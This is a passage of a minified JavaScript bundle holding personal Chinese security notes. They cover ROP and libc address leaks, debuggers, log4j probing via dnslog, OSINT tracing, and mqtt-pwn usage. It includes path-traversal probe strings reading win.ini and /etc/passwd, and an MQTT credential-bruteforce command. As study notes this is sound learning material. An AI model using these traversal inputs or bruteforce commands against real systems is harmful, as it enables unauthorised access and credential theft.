              \u8FC7\u7A0B\u94FE\u63A5\u8868 (PLT) \u4EC5\u5305\u542B\u4E00\u4E2A\u90E8\u5206\uFF0C.plt. \u5BF9\u4E8E\u6211\u4EEC\u7A0B\u5E8F\u4E2D\u5F15\u7528\u7684\u5916\u90E8\u5E93\u4E2D\u7684\u6BCF\u4E2A\u51FD\u6570\uFF0C\u6211\u4EEC\u90FD\u6709\u4E00\u4E2A\u6761\u76EE\uFF0C.plt\u5176\u4E2D\u5B9E\u9645\u4E0A\u662F\u6307\u5411\u8BE5.got.plt\u51FD\u6570\u7684\u5730\u5740\u7684\u8DF3\u8F6C\u3002

          ASLR
              \u901A\u8FC7\u4FE1\u606F\u6CC4\u9732\u51FB\u8D25 ASLR


          ROP
              \u9762\u5411\u8FD4\u56DE\u7684\u7F16\u7A0B

              \u8FD9\u610F\u5473\u7740\u6211\u4EEC\u5C06\u4F7F\u7528\u5185\u5B58\u4E2D\u5DF2\u7ECF\u5B58\u5728\u7684\u51FD\u6570\u548C\u5C0F\u5DE5\u5177\uFF08\u6307\u4EE4\uFF09\u7684\u5730\u5740\u6EA2\u51FA\u8FD4\u56DE\u5730\u5740\uFF0C\u5E76\u4ECE\u4E00\u4E2A\u8DF3\u8F6C\u5230\u53E6\u4E00\u4E2A\u4EE5\u5229\u7528\u8BE5\u6F0F\u6D1E\u3002

              libc
                  \u4F7F\u7528libc \u4E2D system\u51FD\u6570 \u7684\u5730\u5740

                  \u4E3A\u4E86\u7ED5\u8FC7\u968F\u673A\u5316\uFF0C\u6211\u4EEC\u9700\u8981\u6CC4\u6F0F\u51FD\u6570\u7684\u5730\u5740\uFF08\u5728\u6211\u4EEC\u7684\u4F8B\u5B50puts\u4E2D\uFF09.got\uFF0C
                  \u7136\u540E\u4F7F\u7528\u5DEE\u5F02\u8BA1\u7B97\u548C\u7684\u5730\u5740system\uFF08/bin/sh\u5C3D\u7BA1 libc \u7684\u57FA\u5730\u5740\u662F\u968F\u673A\u7684\uFF0C\u4F46\u5176\u4E2D\u7B26\u53F7\u7684\u4F4D\u7F6E\u548C\u504F\u79FB\u91CF\u662F\u76F8\u540C\u7684\uFF09\u3002


          `))},{name:"\u3010Immunity Debugger\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u6587\u4EF6\u2014\u2014\u6253\u5F00

          \u641C\u7D22\u5B57\u7B26\u4E32
              \u8FD0\u884C\u6309\u94AE\u3001F9\u8C03\u8BD5\u3001\u8C03\u8BD5\u2014\u2014\u8FD0\u884C
              \u53F3\u4FA7\u2014\u2014\u5355\u51FB\u2014\u2014\u641C\u7D22
                  \u627E\u5230\u4E4B\u540E\uFF0CFollow in Disassembler
              \u591A\u591A\u8BBE\u7F6E\u3010\u65AD\u70B9\u3011
                  CALL\u64CD\u4F5C\uFF0C\u8BBE\u7F6E\u65AD\u70B9

          \u5728Call\u4E0A\uFF0C\u70B9\u51FBFollow\uFF0C\u53EF\u4EE5\u67E5\u770B\u51FD\u6570

          \u5E38\u7528\u6982\u5FF5
              EAX \u5BC4\u5B58\u5668
              CMP \u8FD0\u7B97\u7B26
              EDX \u5BC4\u5B58\u5668
              JE  \u8FD0\u7B97\u7B26

          `))},{name:"\u3010GDB\u3011\u3001\u3010GDB-peda\u3011\u3001\u3010GEF\u3011\u3001",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          GDB

              \u4ECB\u7ECD\uFF1A
                  \u5168\u79F0\uFF1AGNU Debugger

                  \u8FDC\u7A0B\u8C03\u8BD5\u4F7F\u7528

              \u300Ainfo function\u300B
                  flag()
                  vuln()
                  main()

                  gets()

              GDB-peda
                  pattern create <\u6570\u91CF>

                  EBP
                  EIP
                  starting offset
                      pattern offset

              Cutter
                  123

              fgets()



          GEF
              \u7C7B\u4F3C\u4E8E\u300AGDB\u300B


          `))},{name:"\u3010PEDA\u3011\uFF0C\u662F\u3010GDB\u3011\u7684\u63D2\u4EF6",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          PEDA
              \uFF08\u4E00\u4E2A\u4E0D\u9519\u7684 gdb \u63D2\u4EF6\uFF09

              \u63D0\u4F9B\u4E86\u4E00\u79CD\u901A\u8FC7\u5B57\u7B26\u4E32\u67E5\u627E\u5C0F\u5DE5\u5177\u7684\u597D\u65B9\u6CD5\u3002


          \u3010python\u3011\u4E2D\u7684\u3010PEDA\u3011

              Python Exploit Development Assistance
                  \u8D44\u6599\uFF1Ahttps://github.com/longld/peda



          `))},{name:"\u3010Pwn\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          pwn
              pwn\u4E8C\u8FDB\u5236\u6587\u4EF6
              pwn \u8FDC\u7A0B Web \u670D\u52A1

          `))},{name:"\u3010Pwn\u3011\u7684\u3010\u7B2C\u4E09\u65B9\u6A21\u5757\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          python
              \u300Apwn\u300B\u6A21\u5757
              \u300Apwntools\u300B\u6A21\u5757

          `))},{name:"\u3010UaF\u3011\u3001\u3010Use-after-Free\u3011\u3001\u3010Use after Free\u3011\u3001\u3010UseAfterFree\u3011    \uFF08\u8BE5\u8BCD\u6761\uFF0C\u53EF\u80FD\u7EE7\u7EED\u4F18\u5316\uFF09",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD\uFF1A
              \u6682\u65E0\u7EE7\u7EED\u4ECB\u7ECD\u3002

          `))},{name:"\u3010IDA\u3011\u5DE5\u5177\u3001\u3010CodeBrowser\u3011\u5DE5\u5177\u3001",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4ECB\u7ECD\uFF1A
              \u5C0F\u9ED1\u6559\u7684\u4F7F\u7528\u65B9\u5F0F\uFF1A
                  \u3010IDA\u3011\u7528\u6765\u770B\u4EE3\u7801\uFF1B\u3010CodeBrowser\u3011\u4E5F\u7528\u6765\u770B\u4EE3\u7801\u3002
                      \u6709\u4E9B\u5730\u65B9\uFF0C\u3010IDA\u3011\u7684\u53CD\u7F16\u8BD1\u4F1A\u6709\u95EE\u9898\uFF1B\u6709\u65F6\u5019\u3010CodeBrowser\u3011\u7684\u53CD\u7F16\u8BD1\u4F1A\u51FA\u95EE\u9898\u3002
                          \u5BF9\u7167\u7740\u770B\u3002
                              \u8FD9\u6837\u7684\u8BDD\uFF0C\u5C31\u80FD\u591F\u4E92\u8865\u4E86\u3002

                      \u4E24\u8005\u4EA4\u4E92\uFF1A
                          \u590D\u5236\u3010\u5730\u5740\u3011\uFF0C\u7136\u540E\u641C\u7D22\u5373\u53EF\u3002

                  \u4EE5\u4E00\u4E2A\u3010\u653B\u51FB\u94FE\u3011\u4E3A\u4F8B\uFF0C\u5C0F\u9ED1\u7ED9\u6211\u8BB2\u4E86\uFF1A
                      \u9996\u5148\uFF0C\u4EE3\u7801\u7684\u70B9\uFF0C\u4F1A\u5F62\u6210\u3010\u4E00\u9897\u6811\u3011\u3002

                      \u53EF\u4EE5\u641C\u4E00\u4E9B\u3010system()\u3011\uFF0C\u5E38\u89C1\u7684\u70B9\uFF1B\u5012\u7740\u8FC7\u6765\u627E\uFF1A
                          \u627E\u5230\u5229\u7528\u70B9\uFF0C\u7136\u540E\u5F80\u4E0A\u5BFB\u627E\u3002
                              \u6BD4\u5982\uFF0C\u627E\u5230\u4E00\u4E9B\u3010\u53EF\u63A7\u5B57\u6BB5\u3011\uFF0C\u5C42\u5C42\u4F20\u9012

                          \u6211\u7684\u7406\u89E3\uFF1A
                              \u3010\u6E90\u3011\u2014\u2014\u6570\u636E\u6D41\u2014\u2014\u5229\u7528\u70B9

                  \u7ED9\u4E86\u6211\u4E00\u4E2Abin\u5305\uFF1A
                      \u53EF\u4EE5\u53BB\u67E5\u770B\u4FE1\u606F\u3002

            `,`

          IDA

              \u8D44\u6599\uFF1A
                  \u8BB2\u8FF0\u5F97\u5F88\u6E05\u695A\uFF1Ahttps://medium.com/@gabriel.pirjolescu/pwn-hack-the-box-ropme-write-up-b40179cf5573
                  \u53E6\u5916\u4E00\u7BC7\uFF0C\u539F\u7406\u975E\u5E38\u8BE6\u7EC6\u7684\u8BB2\u89E3\uFF1Ahttps://shaqed.github.io/htb-ropme/



              EAX \u5BC4\u5B58\u5668

              UaF
                  free()
                  \u6211\u4EEC\u4F1A\u770B\u5230\u5728 main_account \u4E0A\u8C03\u7528\u4E86free()\u4F46\u4ECE\u672A\u5220\u9664 main_account \u7684\u5185\u5BB9\u3002
                      \u8FD9\u610F\u5473\u7740\u6211\u4EEC\u4ECD\u7136\u53EF\u4EE5\u5728\u4ECE main_account \u91CA\u653E\u7F13\u51B2\u533A\u540E\u8BBF\u95EE\u5B83\u3002
                      \u56E0\u6B64\uFF0C\u8FD9\u88AB\u79F0\u4E3A\u91CA\u653E\u540E\u4F7F\u7528 (UaF)\u3002

                  \u66F4\u591A\u8D44\u6599\uFF1A
                      https://youtu.be/ZHghwsTRyzQ



              strdup()
                  malloc

              \u4F5C\u4E3A\u5B57\u7B26\u4E32\u8F93\u5165\u7684\u5185\u5BB9\u5C06\u4EE5\u5C0F\u7AEF\u683C\u5F0F\u5B58\u50A8
                  \u8FD9\u610F\u5473\u7740\u6BCF 4 \u4E2A\u5B57\u8282\uFF0C\u5B57\u6BCD\u5C06\u4EE5\u76F8\u53CD\u7684\u987A\u5E8F\u6392\u5217\u3002

              \u4E00\u4E9B\u4F7F\u7528\u65B9\u5F0F\uFF1A

                  main
                  \u653E\u7F6E\u4E00\u4E2A\u65AD\u70B9
                  ret

                  puts()
                      \u5B83\u88AB\u5B9A\u4E49\u4E3Aint puts(const char *s);
                      \u8FD9\u610F\u5473\u7740\u8FD9\u4E2A\u51FD\u6570\u53EA\u9700\u8981 1 \u4E2A\u53C2\u6570\uFF0C\u5B83\u662F\u4E00\u4E2A\u6307\u5411 cstring \u5F00\u5934\u7684\u6307\u9488\u3002

                  fflush()
                      fflush\u5176\u5B9A\u4E49\u4E3Aint fflush(FILE *stream);

                  \u5806\u6808\u5BF9\u9F50\u662F\u8C03\u7528\u51FD\u6570\u65F6\u7684\u4E8B\u60C5
                      \u5728\u4E0B\u6B21\u4F60\u51B3\u5B9A\u641E\u4E71\u8C03\u7528\u65F6\uFF0C\u8981\u8BB0\u4F4F

                  \u6CC4\u6F0F\u5730\u5740
                      \u4E0D\u4EC5\u53EF\u4EE5\u901A\u8FC7\u683C\u5F0F\u5B57\u7B26\u4E32\u5229\u7528\u6765\u5B8C\u6210\uFF0C
                      \u8FD8\u53EF\u4EE5\u901A\u8FC7 ROPing \u6765\u5B8C\u6210puts\uFF01

                      \u6CC4\u6F0F\u5730\u5740\u5E76\u5E0C\u671B\u5728\u65B0\u7684\u6709\u6548\u8D1F\u8F7D\u4E2D\u4F7F\u7528\u5B83\u65F6\uFF0C\u518D\u6B21\u5FAA\u73AF\u56DE main \u53EF\u4EE5\u5E2E\u52A9\u60A8


          `,`

          CodeBrowser

              123

          `))},{name:"\u3010Retargetable Decompiler\u3011 / \u3010RetDec\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          Retargetable Decompiler / RetDec
              \u7C7B\u4F3C\u4E8E\u3010IDA\u3011

          `))},{name:"\u3010ret2plt\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u3010GLIBC\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          GLIBC
              \u8D44\u6599\uFF1A
                  \u6211\u4EEC\u53EF\u4EE5\u4F7F\u7528\u4E00\u4E2A\u5DE5\u5177\u6765\u4E3A\u6211\u4EEC\u8FDB\u884C\u8BA1\u7B97\u3002\u4ECB\u7ECD\uFF1A
                      libc \u6570\u636E\u5E93\uFF1Ahttps://libc.blukat.me/

              \u8BA9\u6211\u4EEC\u5728 libc \u6570\u636E\u5E93\u4E2D\u67E5\u770B\u5B83\uFF0C\u4EE5\u4E86\u89E3\u8FDC\u7A0B\u673A\u5668\u4E0A\u7684 libc \u7248\u672C\uFF1A

              \u6211\u4EEC\u53EF\u80FD\u8FD8\u5FC5\u987B\u6CC4\u6F0Ffflush\u548Cfgets

          `))},{name:"\u3010pop rdi\u3011\u5C0F\u5DE5\u5177",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u3010pop rdi\u3011\u5C0F\u5DE5\u5177
              \u539F\u56E0\u662F x64 \u4E2D\u7684\u8C03\u7528\u7EA6\u5B9A\u662F \u53C2\u6570\u5B58\u50A8\u5728\u5BC4\u5B58\u5668\u4E2D\uFF0C\u7B2C\u4E00\u4E2A\u53C2\u6570\u5B58\u50A8\u5728rdi\u5BC4\u5B58\u5668\u4E2D\u3002

          `))},{name:"\u3010libc-database\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          libc-database
              Build a database of libc offsets \uFF0C\u6765\u7B80\u5316epx

              \u8D44\u6599\uFF1A
                  \u4ED3\u5E93\uFF1Ahttps://github.com/niklasb/libc-database
                  \u5C55\u793ADemo\uFF1Ahttps://libc.rip/

          `))}]},me=ee,ge=g.l.singleATag_blank,fe={name:"\u3010\u53CD\u5E8F\u5217\u5316\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u3010YsoSerial\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u4ECB\u7ECD\uFF1A
              YsoSerial

          `))}]},Nu=fe,Ou=g.l.singleATag_blank,Gu={name:"\u3010DNS\u3011_\u624B\u518C",steps:[{name:"\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(""))},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010dnslog.cn\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          dnslog.cn
              \u63A2\u6D4B\u3010log4j\u3011
              \u7406\u60F3\u60C5\u51B5\u4E0B\uFF0C\u6211\u4EEC\u5EFA\u8BAE\u60A8\u8BBE\u7F6E\u81EA\u5DF1\u7684 Burp Collaborator \u6216 Interactsh \u670D\u52A1\u5668\u6765\u6D4B\u8BD5\u6B64\u6F0F\u6D1E\u3002


          `))}]},Ku=Gu,Ce=g.l.singleATag_blank,Ae={name:"\u3010\u6D4F\u89C8\u5668\u3011_\u3010Firefox\u3011_\u3010Chrome\u3011_\u624B\u518C",steps:[{name:"\u3010FireFox\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


          FireFox
              \u3010sessionstore-backups\u3011

              \u4E5F\u7ECF\u5E38\u53EF\u4EE5\uFF0C\u7528\u4F5C\u3010\u5355\u4E2A\u5173\u952E\u5B57\u3011\u67E5\u627E

          `))}]},he=Ae,de=n("HJBr"),pe=n("ONbu"),Be=n("qhoQ"),je=g.l.singleATag_blank,Oe={name:"\u3010BlockChain\u3011_\u3010\u533A\u5757\u94FE\u3011_\u3010\u6570\u5B57\u8D27\u5E01\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u975E\u5E38\u8BE6\u7EC6\u7684\uFF0C\u3010\u533A\u5757\u94FE\u9632\u5B88\u624B\u518C\u3011\uFF0C\u7CFB\u7EDF\u5316\u7684\u8868\u8FF0\uFF1A

              \u533A\u5757\u94FE\u9ED1\u6697\u68EE\u6797\u81EA\u6551\u624B\u518C
                  \u8D44\u6599\uFF1Ahttps://github.com/slowmist/Blockchain-dark-forest-selfguard-handbook

                  \u4F53\u7CFB\uFF1A
                      \u57FA\u672C\u77E5\u8BC6\uFF1A
                          \u521B\u5EFA\u94B1\u5305
                          \u5907\u4EFD\u94B1\u5305
                          \u4F7F\u7528\u94B1\u5305
                          \u4F20\u7EDF\u9690\u79C1\u4FDD\u62A4
                          \u4EBA\u6027\u5B89\u5168

                      \u533A\u5757\u94FE\u5E38\u89C1\u4F5C\u6076\u65B9\u5F0F
                          123

                      \u88AB\u76D7\uFF08\u5E01\uFF09\u4E86\u600E\u4E48\u529E
                          123

                      \u5BF9\u3010\u533A\u5757\u94FE\u653B\u51FB\u884C\u4E3A\u3011\u8BA4\u77E5\u8BEF\u533A
                          123

                      \u603B\u7ED3
                          123

          `))}]},We=Oe,Ge=g.l.singleATag_blank,we={name:"\u3010APP\u3011_\u3010Apk\u3011_\u3010Android\u3011_\u3010\u5B89\u5353\u3011_\u3010iOS\u3011_\u3010Apple\u3011_\u3010\u82F9\u679C\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u5BF9\u3010\u77E5\u4E4EAPP\u3011\u7684\u5206\u6790\uFF1A
              1.\u300A\u77E5\u4E4E\u5206\u6790-Android\u5B89\u5168-\u770B\u96EA\u8BBA\u575B-\u5B89\u5168\u793E\u533A\u300B
                      https://bbs.pediy.com/thread-272184.htm

          \u76F8\u5173\u5DE5\u5177\uFF1A
              UniDbg

              Frida


          `))}]},Te=we,Xe=g.l.singleATag_blank,He={name:"\u3010\u6EAF\u6E90\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u76F8\u5173\u8FFD\u8E2A\u8FC7\u7A0B\uFF1A
                  Fake dnSpy - \u5F53\u9ED1\u5BA2\u4E5F\u4E0D\u8BB2\u4F0D\u5FB7 - \u5B89\u5168\u5BA2\uFF0C\u5B89\u5168\u8D44\u8BAF\u5E73\u53F0
                          https://www.anquanke.com/post/id/265809

          \u5728\u7EBF\u5DE5\u5177\uFF1A
                  WebArchive
                          \u4E92\u8054\u7F51\uFF0C\u662F\u6709\u8BB0\u5FC6\u7684
                          https://wayback.archive.org/

                  EmailRecordsFinder
                          \u90AE\u4EF6\u8BB0\u5F55\u7684\u67E5\u627E\u5668\u3002

                          https://recordsfinder.com/email/
                                  \u6D4B\u8BD5\u94FE\u63A5\uFF1Ahttps://recordsfinder.com/search/email/results/?flow=email&email=CARBON1986%40PROTONMAIL.COM&country=US&transactionId=58e138893ea0ea6d1fdd7679d5d06164

          \u672C\u5730\u5DE5\u5177\uFF1A

                  Maltego
                          123

          `))}]},Ue=He,Ie=n("jEKr"),Qe=g.l.singleATag_blank,Ke={name:"\u3010\u4EFB\u610F\u6587\u4EF6\u4E0B\u8F7D\u3011_\u3010\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u3011_\u3010\u4EFB\u610F\u6587\u4EF6\u5305\u542B\u3011",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u540E\u7EED\u5371\u5BB3\uFF1A
              \u8BFB\u53D6\u6240\u6709\u6587\u4EF6\uFF0C\u8BFB\u53D6\u6240\u6709\u51ED\u8BC1

              \u5E38\u89C1\uFF1A
                  \u4F7F\u7528\u3010\u5185\u7F51\u6E17\u900F\u3011\u7684\u601D\u8DEF\uFF0C\u53BB\u505A\u540E\u7EED\u7684\u4E8B\u60C5\u3002
                      \u90A3\u4F7F\u7528\u7684\u9762\uFF0C\u53EF\u5C31\u592A\u5E7F\u4E86

          `))},{name:"\u5E38\u7528\u3010\u63A2\u6D4B\u8DEF\u5F84\u3011",desc:e.a.createElement(e.a.Fragment,null),content:Promise.resolve().then(n.bind(null,"QL8i")).then(function(Xu){var $u=Xu.\u5E38\u89C1\u9690\u79C1\u6587\u4EF6_\u654F\u611F\u6587\u4EF6_\u91CD\u8981\u914D\u7F6E\u6587\u4EF6_Helper,ne=$u.Windows;return $u.Linux.then(function(ze){return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
              https://www.1rql.com/3721.html
              https://99836.vip/2021/09/03/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%96%87%E6%A1%A3.html
              \u6587\u4EF6\u5305\u542B\u6F0F\u6D1E\u5C0F\u7ED3 - Dis-a - \u535A\u5BA2\u56ED    https://www.cnblogs.com/appear001/p/11149996.html

          Windows
              \u57FA\u672C\u4F7F\u7528\u65B9\u5F0F\uFF1A
                  \u76F8\u5BF9\u8DEF\u5F84\uFF1A
                      \u3010../../windows/win.ini\u3011
                      \uFF08\u6CE8\u610F\uFF0C\u5411\u4E0A\u63A2\u5BFB\u53EF\u4EE5\u65E0\u9650\u957F\u3002\u90FD\u4E0D\u4F1A\u62A5\u9519\uFF09
                          \u3010../../../../../../../../../../../../../../../../../../../../../../../../../../windows/win.ini\u3011
                  \u7EDD\u5BF9\u8DEF\u5F84\uFF1A
                      \u3010c:/windows/win.ini\u3011
                      \u3010file:///c:/windows/win.ini\u3011
                          \u3010\u7B2C\u4E00\u4E2A\u53CC//\u3011\u4EE3\u8868\u534F\u8BAE\u3001\u3010\u7B2C\u4E09\u4E2A\u5355/\u3011\u4EE3\u8868\u6839\u8DEF\u5F84\u3002
                  \u5173\u952E\u8981\u70B9\uFF1A
                      \u3010\u7EDD\u5BF9\u8DEF\u5F84\u3011\u6216\u8005\u3010\u76F8\u5BF9\u8DEF\u5F84\u3011\uFF0C\u540C\u65F6\u53EA\u4F7F\u7528\u4E00\u6B21\u3002
          `,ne,`
          Linux
              \u57FA\u672C\u4F7F\u7528\u65B9\u5F0F\uFF1A
                  \u548CWindows\u5927\u540C\u5C0F\u5F02\uFF1A
                      \u5DEE\u522B\u70B9\uFF1A
                          \u3010\u5206\u9694\u7B26\u3011\u7684\u6B63\u659C\u6760\u3001\u53CD\u659C\u6760\u3002
                          \u3010\u76D8\u7B26\u3011\u7684\u5207\u6362\u3002
                  \u4E3E\u4F8B\uFF1A
                      \u3010/etc/passwd\u3011
                      \u3010file:///etc/passwd\u3011
                          \u3010\u7B2C\u4E00\u4E2A\u53CC//\u3011\u4EE3\u8868\u534F\u8BAE\u3001\u3010\u7B2C\u4E09\u4E2A\u5355/\u3011\u4EE3\u8868\u6839\u8DEF\u5F84\u3002
            `,ze))})})}]},Le=Ke,Ye=g.l.singleATag_blank,Fe={name:"\u3010\u7269\u8054\u7F51\u3011_\u3010MQTT\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u4ECB\u7ECD\uFF1A
              \u548C\u7269\u8054\u7F51\u76F8\u5173\u3002
                  MQTT\u6D88\u606F\u961F\u5217\u9065\u6D4B\u4F20\u8F93\uFF08\u82F1\u8BED\uFF1AMessage Queuing Telemetry Transport\uFF09\u3002
                  \u57FA\u4E8E\u53D1\u5E03 (Publish)/\u8BA2\u9605 (Subscribe)\u8303\u5F0F\u7684\u6D88\u606F\u534F\u8BAE
              \u539F\u7406\uFF1A
                  \u5B83\u5DE5\u4F5C\u5728 TCP/IP\u534F\u8BAE\u65CF\u4E0A\u3002
                  \u662F\u4E3A\u786C\u4EF6\u6027\u80FD\u4F4E\u4E0B\u7684\u8FDC\u7A0B\u8BBE\u5907\u4EE5\u53CA\u7F51\u7EDC\u72B6\u51B5\u7CDF\u7CD5\u7684\u60C5\u51B5\u4E0B\u800C\u8BBE\u8BA1\u7684\u53D1\u5E03/\u8BA2\u9605\u578B\u6D88\u606F\u534F\u8BAE\u3002
                      \u7279\u522B\u9002\u5408\u4E8E\u3010\u7269\u8054\u7F51\u3011\u573A\u666F\u3002
              \u8D44\u6599\uFF1A
                  https://t.zsxq.com/nYzRrbU
                      \u5C55\u793A MQTT \u5728 C2 \u4E2D\u7684\u4F7F\u7528\u4EE5\u53CA\u7269\u8054\u7F51\u4E91\u670D\u52A1\u4E0E\u690D\u5165\u7269\u96C6\u6210\u7684\u65B9\u5F0F\u3002
                          \u57FA\u4E8EMQTT\u534F\u8BAE\u7684C2\uFF0C\u5229\u7528IoT\u4E91\u7684\u5404\u79CD\u57FA\u7840\u8BBE\u65BD\u6765\u4F5C\u4E3AC2\u7684\u57FA\u7840\u8BBE\u65BD\u3002

          `))},{name:"\u3010mqtt-pwn\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

  \u6846\u67B6\u4F7F\u7528\uFF1A
      mqtt-pwn
          \u8D44\u6599\uFF1A
              \u4ED3\u5E93\u5730\u5740\uFF1Ahttps://github.com/akamai-threat-research/mqtt-pwn.git
          \u542F\u52A8CLI\u6D41\u7A0B\uFF1A
              docker\u542F\u52A8\u65B9\u5F0F\uFF1A
                  docker-compose  up  --build  --detach
                      \u4EE5\u5206\u79BB\u6A21\u5F0F\u6784\u5EFA\u548C\u521B\u5EFA\u6211\u4EEC\u7684\u5BB9\u5668\uFF0C\u8FD9\u610F\u5473\u7740\u5B83\u4EEC\u5C06\u5728\u540E\u53F0\u8FD0\u884C\u3002
              \u67E5\u770B\u72B6\u6001\uFF1A
                  docker-compose  ps
              \u542F\u52A8cli
                  docker-compose  run  cli
          \u57FA\u672C\u4F7F\u7528\uFF1A
              connect
                  connect  -o  <Host\u4E3B\u673A>
                      \u5982\u679C\u6CA1\u63D0\u793A\u3010\u8FDE\u63A5\u5931\u8D25\u3011\uFF0C\u90A3\u5C31\u662F\u6210\u529F\u4E86\u3002
                          \u53EF\u4EE5\u7528\u3010system_info\u3011\u8FDB\u884C\u786E\u8BA4\u3002
                      \u767B\u4E0D\u8FDB\u53BB\uFF0C\u5C31\u53EF\u4EE5\u3010\u7206\u3011
                          \u6709\u65F6\u5019\uFF0C\u3010\u7206\u3011\u4E86\u518D\u56DE\u6765\u767B\uFF0C\u5C31\u53EF\u4EE5\u4E86\uFF1F\uFF1F\uFF1F
              system_info
                  \u67E5\u770B\uFF0C\u57FA\u672C\u4FE1\u606F\u3002\uFF08\u4EC5\u5728\u3010\u6210\u529F\u8FDE\u63A5\u3011\u60C5\u51B5\u4E0B\uFF0C\u6709\u6548\uFF09

              disconnect

              bruteforce
                  \u5BC6\u7801\u7206\u7834\u6A21\u5757
                  bruteforce  --host  <\u4E3B\u673A>  --port  <\u7AEF\u53E3>  -uf  <\u7528\u6237\u540D\u8BCD\u5178\uFF0C\u6BD4\u5982resources/wordlists/usernames.txt>  -pf  <\u5BC6\u7801\u8BCD\u5178\uFF0C\u6BD4\u5982resources/wordlists/passwords.txt>
              discovery
                  \u542F\u52A8\u3010scans\u3011\u626B\u63CF

              sonoff
                  \u4ECB\u7ECD\uFF1ASonoff \u8BBE\u5907\u503E\u5411\u4E8E\u6309\u9700\u5171\u4EAB\u67D0\u4E9B\u4FE1\u606F\u3002 \u8BE5\u6A21\u5757\u4E3B\u52A8\u67E5\u627E\u8FD9\u4E9B\u4FE1\u606F\u3002
                  sonoff
                      \u76F4\u63A5\u5F00\u59CB\u67E5\u627E\uFF0C\u663E\u793A\u3010  [!] Sonoff exploit running ...  \u3011
              scans
                  scans
                      \u67E5\u770B\u3010\u626B\u63CF\u3011\u60C5\u51B5
